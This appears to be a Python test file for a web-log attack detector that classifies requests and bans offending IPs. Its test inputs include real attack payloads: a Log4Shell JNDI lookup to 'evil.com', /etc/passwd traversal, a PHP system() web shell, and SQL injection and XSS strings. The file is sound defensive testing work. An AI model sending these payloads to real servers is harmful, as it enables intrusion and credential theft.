from __future__ import annotations

import os
import tempfile
import threading
import time
import unittest
import unittest.mock as m

from helpers import Env, core
from sentinel import explain, weblogs


def ln(ip, req, status=200, ua="Mozilla/5.0 (X11; Linux x86_64) Chrome/120", method="GET"):
    return f'{ip} - - [01/Nov/2026:15:00:00 -0300] "{method} {req} HTTP/1.1" {status} 512 "-" "{ua}"'


class ClasificarTests(unittest.TestCase):
    def kinds(self, req, status=200, ua="Mozilla/5.0", method="GET"):
        return weblogs.classify(weblogs.parse(ln("203.0.113.9", req, status, ua, method)))

    def test_ataques_conocidos(self):
        self.assertIn("web_sqli", self.kinds("/index.php?id=1%20UNION%20SELECT%20user,pass%20FROM%20users"))
        self.assertIn("web_sqli", self.kinds("/p?x=1%27%20or%20%271%27%3D%271"))
        self.assertIn("web_traversal", self.kinds("/download?f=../../../../etc/passwd"))
        self.assertIn("web_traversal", self.kinds("/download?f=..%2f..%2fetc%2fpasswd"))
        self.assertIn("web_rce", self.kinds("/?x=${jndi:ldap://evil.com/a}"))
        self.assertIn("web_rce", self.kinds("/cgi-bin/x?cmd=cat%20/etc/passwd", 404))
        self.assertIn("web_rce", self.kinds("/?q=%3C%3Fphp%20system(%24_GET%5B0%5D)"))
        self.assertIn("web_xss", self.kinds("/s?q=<script>alert(1)</script>"))
        self.assertIn("web_secretos", self.kinds("/.env", 404)); self.assertIn("web_secretos", self.kinds("/.git/config", 404))
        self.assertIn("web_secretos", self.kinds("/.env", 200))                            # además es una fuga
        self.assertIn("web_escaner", self.kinds("/", 200, "sqlmap/1.7"))
        self.assertIn("web_sondeo", self.kinds("/wp-login.php", 404)); self.assertIn("web_sondeo", self.kinds("/phpmyadmin/", 404))
        self.assertIn("web_login", self.kinds("/wp-login.php", 200, method="POST"))
        self.assertEqual(self.kinds("/no-existe.html", 404), ["web_404"])

    def test_trafico_normal_no_dispara_nada(self):
        for req, st in (("/", 200), ("/productos?categoria=zapatos&pagina=2", 200), ("/img/logo.png", 200), ("/api/predio?x=1", 204), ("/login", 200), ("/buscar?q=union+de+chile", 200),
                        ("/blog/como-hacer-una-seleccion-de-personal", 200), ("/wp-login.php", 200), ("/favicon.ico", 200), ("/robots.txt", 200), ("/descargar?archivo=informe.pdf", 200)):
            self.assertEqual(self.kinds(req, st), [], req)
        self.assertEqual(self.kinds("/login", 200, method="GET"), [])
        self.assertEqual(weblogs.classify(weblogs.parse(ln("1.2.3.4", "/", 200, "curl/8.0"))), [])           # curl no es un escáner
        self.assertIsNone(weblogs.parse("esto no es una línea de registro"))


class VigilanciaTests(unittest.TestCase):
    def setUp(self):
        self.e = Env()
        self.banned = []
        self.banner = m.Mock(); self.banner.ban = lambda ip, why, *a, **k: self.banned.append((ip, why))
        self.w = weblogs.WebWatch(self.e.cfg, self.e.alerter, self.e.allow, self.banner)

    def tearDown(self):
        self.e.close()

    def test_rce_bloquea_a_la_primera(self):
        self.assertEqual(self.w.feed(ln("203.0.113.9", "/?x=${jndi:ldap://x/a}", 400)), ["web_rce"])
        self.assertEqual(self.banned[0][0], "203.0.113.9"); self.assertIn("ejecutar comandos", self.banned[0][1])

    def test_umbrales_y_ventana(self):
        t = 1000.0
        for i in range(2):
            self.assertEqual(self.w.feed(ln("203.0.113.9", "/a?id=1%20union%20select%201", 200), t + i), [])        # 2 intentos: todavía no
        self.assertEqual(self.w.feed(ln("203.0.113.9", "/a?id=1%20union%20select%201", 200), t + 3), ["web_sqli"])  # el tercero dispara
        self.assertEqual(self.w.feed(ln("203.0.113.9", "/a?id=1%20union%20select%201", 200), t + 4), [])            # y no repite el aviso enseguida
        for i in range(29):
            self.w.feed(ln("198.51.100.4", f"/x{i}", 404), t + i)
        self.assertEqual(self.w.feed(ln("198.51.100.4", "/x30", 404), t + 30), ["web_404"])
        self.assertEqual([i for i, _ in self.banned], ["203.0.113.9", "198.51.100.4"])

    def test_404_normales_repartidos_en_el_tiempo_no_bloquean(self):
        for i in range(40):
            self.assertEqual(self.w.feed(ln("198.51.100.9", f"/viejo{i}", 404), 1000 + i * 30), [])           # uno cada 30 s: no es ráfaga
        self.assertEqual(self.banned, [])

    def test_ip_protegida_no_se_bloquea(self):
        self.assertEqual(self.w.feed(ln("192.168.1.50", "/?x=${jndi:ldap://x}", 200)), [])
        self.assertEqual(self.w.feed(ln("127.0.0.1", "/.env", 404)), []); self.assertEqual(self.banned, [])

    def test_sin_bloqueo_si_se_desactiva(self):
        self.e.cfg.set("weblog", "ban", "no"); w = weblogs.WebWatch(self.e.cfg, self.e.alerter, self.e.allow, self.banner)
        self.assertEqual(w.feed(ln("203.0.113.9", "/?x=${jndi:x}")), ["web_rce"]); self.assertEqual(self.banned, [])

    def test_sigue_un_archivo_y_aguanta_la_rotacion(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "access.log"); open(p, "w").write(ln("203.0.113.1", "/viejo") + "\n")
            self.e.cfg.set("weblog", "paths", os.path.join(d, "*access*.log")); w = weblogs.WebWatch(self.e.cfg, self.e.alerter, self.e.allow, self.banner)
            stop = threading.Event(); th = threading.Thread(target=w.follow, args=(stop.is_set, 0.05), daemon=True); th.start(); time.sleep(0.3)
            with open(p, "a") as f:
                f.write(ln("203.0.113.9", "/?x=${jndi:ldap://x/a}") + "\n")
            time.sleep(0.4); self.assertEqual([i for i, _ in self.banned], ["203.0.113.9"])             # lo viejo se ignoró; lo nuevo se analizó
            os.replace(p, p + ".1"); open(p, "w").write(ln("203.0.113.7", "/.git/config", 404) + "\n" + ln("203.0.113.7", "/?q=<?php%20system(1)") + "\n")
            time.sleep(0.5); stop.set(); th.join(1)
            self.assertIn("203.0.113.7", [i for i, _ in self.banned])                                   # archivo nuevo tras rotar


class ExplicacionTests(unittest.TestCase):
    def test_cada_tipo_tiene_explicacion_para_ninos(self):
        for k in ("web_rce", "web_sqli", "web_traversal", "web_xss", "web_secretos", "web_escaner", "web_sondeo", "web_login", "web_404"):
            t = explain.TIPOS[k]
            self.assertTrue(t["nombre"] and t["nino"] and t["sirve"] and t["peligro"], k)


if __name__ == "__main__":
    unittest.main()
